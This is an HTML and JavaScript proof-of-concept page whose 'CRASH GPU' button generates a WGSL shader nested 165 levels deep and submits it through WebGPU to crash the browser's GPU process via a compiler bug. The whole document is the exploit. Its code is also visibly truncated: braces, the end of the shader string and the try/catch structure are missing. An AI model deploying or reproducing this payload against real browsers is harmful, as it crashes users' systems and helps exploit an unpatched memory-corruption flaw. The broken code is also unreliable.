    <button id="crashBtn" style="padding: 20px; font-size: 20px; background: red; color: white; cursor:pointer;">CRASH GPU</button>

    <script>
        // We use the exact magic depth (165) discovered in the wild that 
        // triggers the AST abort state corruption and SIGTRAP.
        function buildKillerShader() {
            let mathExpr = "(1.0)";
            const ops = ['+', '-', '*', '/'];
            
            for (let i = 0; i < 165; i++) {
                // Using the exact payload structure from the crash log
                const op = ops[i % 4]; 
                mathExpr = `(${mathExpr} ${op} vec4<f32>(vec2<f32>(1.0, 1.0), vec2<f32>(1.0, 1.0)).x)`;
            }
            return `
                @vertex fn vs_main() -> @builtin(position) vec4<f32> {
                    let crazy_var = ${mathExpr};
                    return vec4<f32>(crazy_var, 0.0, 0.0, 1.0);

        async function triggerCrash() {
            if (!navigator.gpu) {
                alert("WebGPU is not supported.");
                return;
            }

            const adapter = await navigator.gpu.requestAdapter();
            const device = await adapter.requestDevice();

            const killerWGSL = buildKillerShader();
            console.log("Sending payload to Tint...");
            
            try {
                // This call crashes the GPU Process
                device.createShaderModule({ code: killerWGSL });

                console.log("Caught:", e);

        document.getElementById('crashBtn').addEventListener('click', triggerCrash);
    </script>
